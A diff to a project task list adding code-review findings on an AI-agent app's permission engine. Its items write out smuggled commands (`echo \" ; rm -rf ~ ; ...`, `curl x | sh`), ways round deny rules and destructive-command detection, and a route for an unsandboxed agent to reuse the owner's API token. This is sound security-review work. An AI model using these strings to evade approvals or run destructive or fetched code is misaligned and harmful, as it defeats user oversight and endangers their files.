@@ -800,6 +800,29 @@ stay small so they merge cleanly into either.
 - [ ] Label-in-name (WCAG 2.5.3): a button on the approval card, and the composer's "Send now" whose name is
       "Delivery: steer. Switch to queue".
 
+### I2 — Permission engine, from its code review (agent I, branch fx-i-permissions)
+- [ ] HIGH: `splitCommand` ignores backslash escapes: `echo \" ; rm -rf ~ ; echo \"` is one read-only `echo`
+      segment (Ask allows it; a remembered `echo` rule allows it); `bun test \" && curl x | sh && \"` passes an allow
+      for `bun test`. /bin/sh runs every part.
+- [ ] HIGH: the read-only project floor only denies kind 'edit'; `propose` (kind 'proposal', edits:true) matches an
+      `edit *` allow anywhere and the server writes the file into the read-only project with no card.
+- [ ] HIGH: since e4c6c6f a chats-only device can open ~/.ssh: `PUT /api/chats/:id/readable` is open to them and
+      allowReadInChat now refuses only the data folder.
+- [ ] Remembered rules are not checked against what the card offered (any rule, any scope the device may set;
+      decision not tied to `approved`); chat scope is open to chats-only devices.
+- [ ] Offered prefixes are broader than the command shown (`rm -rf build` offers `rm`; `sudo …` offers `sudo`;
+      `bash -c`/`python -c` offer the bare interpreter); rules beat the preset, so "allow rm everywhere" removes Auto's
+      destructive ask for good.
+- [ ] Channel "Always": remember → applyRules → redecideApprovals already approves, then decideApproval throws "no
+      longer waiting" and the owner is told it failed; the label names the tool but saves the first offer.
+- [ ] Deny rules are easy to dodge (`git -C . push`, `'git' push`, `\git push`, `sudo/command/timeout/env … git
+      push`) and Auto's destructive detection misses `/bin/rm -rf`, `env -i rm`, `xargs rm`, `bash -c "rm…"`,
+      `git checkout .`, `git branch -d`.
+- [ ] Sensitive reads over channels: no key warning for the owner; "Always allow request_read" still offered.
+- [ ] LOW: run_checks never asks (not GUARDED, kind 'other'); the approval route decides before saving the rule;
+      `PUT /api/projects/:id/permissions` with `{preset}` and no `rules` is read as legacy and clears both; the
+      access-changed notice tells agents to retry things the person declined.
+
 ### [decide]
 - [ ] Full access and approvals: an unsandboxed agent can read `~/.myrmidon/server.json` and call the API as you.
       Keep the token out of reach (keychain, a per-run secret the API demands for approvals), or say plainly that
